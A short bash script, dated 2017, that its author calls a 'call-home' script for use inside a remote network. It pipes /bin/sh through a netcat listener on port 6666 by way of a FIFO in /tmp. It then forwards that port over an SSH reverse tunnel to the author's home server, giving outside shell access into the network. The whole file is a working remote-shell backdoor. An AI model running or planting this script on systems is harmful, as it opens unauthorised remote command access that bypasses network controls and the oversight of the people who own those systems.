#!/bin/bash
# This is a call-home script I wrote that function from within a remote network
# Last Edit: 07.27.2017
#
# open a fifo file for netcat to use
/bin/rm -f /tmp/x
/usr/bin/mkfifo /tmp/x
#
# pipe shell session through NC
/bin/sh 2>&1 < /tmp/x | /bin/nc -lvp 6666 > /tmp/x &
#
# forward ports over SSH to home server...in other words, call home
ssh -R 6666:0.0.0.0:6666 user@homeserver.home -N
# END
